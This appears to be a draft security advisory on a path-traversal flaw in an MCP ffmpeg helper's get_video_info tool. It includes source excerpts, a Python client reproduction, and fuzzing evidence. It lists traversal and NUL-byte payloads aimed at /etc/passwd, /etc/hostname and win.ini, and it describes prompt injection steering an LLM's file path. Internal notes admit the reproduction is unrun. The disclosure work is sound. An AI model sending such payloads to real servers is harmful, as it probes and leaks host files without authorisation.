# Path traversal in `get_video_info`: `filePath` is not confined, so any media file's metadata can be read and any path's existence probed

**Repository:** `sworddut/mcp-ffmpeg-helper` · **Tool:** `get_video_info` · **Tested commit:** `d68d010`
**Weakness:** CWE-22 Path Traversal

## Summary
`get_video_info` runs `ffprobe` on `filePath` and returns the output. The path is used exactly as given. Absolute paths and `../` sequences are accepted, and the server has no base directory it stays inside. A caller can read the full container metadata of any media file the server user can read, and can tell whether any path on the host exists from the error text.

## Details
`src/tools/handlers.ts:11-13` passes the argument straight through:

```ts
case "get_video_info": {
  const filePath = validatePath(String(args?.filePath), true);
  const info = await getVideoInfo(filePath);
```

`validatePath` (`src/utils/file.ts:23-33`) checks only that the string is non-empty and that the file exists:

```ts
export function validatePath(path: string, isInput: boolean = false): string {
  if (!path) {
    throw new Error("File path is required");
  }
  if (isInput && !existsSync(path)) {
    throw new Error(`Input file does not exist: ${path}`);
  }
  return path;
}
```

`getVideoInfo` (`src/utils/ffmpeg.ts:60-79`) then runs `ffprobe -v error -show_format -show_streams -print_format json <filePath>` and returns stdout, or stderr if ffprobe fails. Nothing resolves the path and compares it with an allowed root. A missing file gives `Input file does not exist: ...`. An existing file that is not media gives an ffprobe error instead. That difference lets a caller test whether any path exists.

This tool calls `ffprobe` with an argument array, so the shell-string problem in the other tools of this server (see `src/utils/ffmpeg.ts:33-40`) does not apply here.

## Steps to reproduce
1. Prerequisites: a Linux host (for `/etc/hostname`), Node.js (README: v14+), and `ffmpeg`/`ffprobe` on `PATH`. Create a test video and a working directory for the server:
   ```bash
   ffmpeg -f lavfi -i testsrc=duration=1:size=64x64:rate=1 -pix_fmt yuv420p /tmp/tofu-in.mp4
   mkdir -p /tmp/tofu-work/a/b/c
   ```
2. Install and build as the README describes:
   ```bash
   git clone https://github.com/sworddut/mcp-ffmpeg-helper.git
   cd mcp-ffmpeg-helper && npm install && npm run build
   ```
   The server is `node build/index.js`. The script below starts it with `/tmp/tofu-work/a/b/c` as its working directory.
3. Call the tool with these three argument sets:
   ```json
   {"filePath": "../../../../../../../../tmp/tofu-in.mp4"}
   {"filePath": "/etc/hostname"}
   {"filePath": "/etc/tofu-does-not-exist"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="node",
           args=["/path/to/mcp-ffmpeg-helper/build/index.js"],
           cwd="/tmp/tofu-work/a/b/c",
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               for p in ["../../../../../../../../tmp/tofu-in.mp4",
                         "/etc/hostname",
                         "/etc/tofu-does-not-exist"]:
                   result = await session.call_tool("get_video_info", {"filePath": p})
                   print(p, result)

   asyncio.run(main())
   ```
4. Observe: the first call returns ffprobe JSON (format, streams, tags) for a file outside the server's working directory. The second returns an ffprobe error, which shows the file exists. The third returns `Input file does not exist: /etc/tofu-does-not-exist`.

## Expected behavior
The server only probes files under a configured media or project directory and rejects other paths before touching the filesystem. Missing and out-of-scope paths get the same generic error.

## Actual behavior
Any path is accepted. During fuzzing, absolute and traversal paths went straight to `existsSync`:

```
Error: Input file does not exist: ../../../../etc/passwd
Error: Input file does not exist: /etc/passwd\x00
```

These calls stopped at the existence check. The relative path did not resolve to a file from the sandboxed working directory, and Node treats a path with a NUL byte as missing. No check after that point would have stopped them.

## Impact
The LLM chooses `filePath`, and prompt injection in content it reads (a web page, a document, a transcript) can steer that choice. An attacker can learn which files exist on the host and pull metadata from any readable media file: titles, encoder, creation time and, for many phone recordings, a GPS location tag. Non-media files return only an error, not their contents. On its own this is low severity. It matters more because the write tools in this server use the same `validatePath`.

## Suggested fix
- Add an allowed root, for example a CLI argument or env var that defaults to the working directory. Resolve each path with `fs.realpathSync` (or `path.resolve` for paths that do not exist yet) and reject it unless it is inside that root.
- Return the same error for missing and out-of-scope paths.

## Status on the default branch
Still present at `d68d010` (2026-01-04). The tested commit is the current default branch head.

## Prior reports
- #6 "Security: OS command injection via unsanitized tool arguments in runFFmpegCommand (shell:true)" (issue, open 2026-07-11): reports `shell: true` command injection in the other tools; `get_video_info` uses `ffprobe` with an argument array and is not listed. It notes that `validatePath()` only checks existence but does not report path traversal. Not a duplicate.
- Documentation: README.md: "C:/Users/username/videos/movie.mp4" (the usage examples pass absolute paths under the user's home, and there is no security section and no allowed-directory setting, so reading any path the user can read looks like the intended contract)

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal (CWE-22); `check_path_traversal` (evidence), `check_reflected_output` also fired on this tool.
- Campaigns and executions: corpus-sbx 2560 exec / 2560 ok; e2-0922 1 exec / 1 ok (60 s budgets).
- Evidence (verbatim, trimmed):
  - `{'filePath': '/etc/passwd\x00'}` -> `Error: Input file does not exist: /etc/passwd\x00`
  - `{'filePath': '../../../../etc/passwd'}` -> `Error: Input file does not exist: ../../../../etc/passwd`
  - `{'filePath': '..\\..\\..\\..\\windows\\win.ini'}` -> `Error: Input file does not exist: ..\\..\\..\\..\\windows\\win.ini`
- Hand-check hints: weak. The path reaches `existsSync` and `ffprobe` with no containment (confirmed in source), but the server defines no intended directory. The README examples use absolute paths such as `C:/Users/username/videos/...`, so arbitrary paths are the documented contract. No evidence call read a file; all three stopped at "does not exist". The only effects are an existence oracle and metadata disclosure. Same root cause as the other 7 drafts for this repo; consider filing one consolidated issue. The more serious issue in this repo is CWE-78 (`shell: true` in `src/utils/ffmpeg.ts:36-40`), which does not affect this tool. The reproduction above was derived from the code and has not been run.
</details>
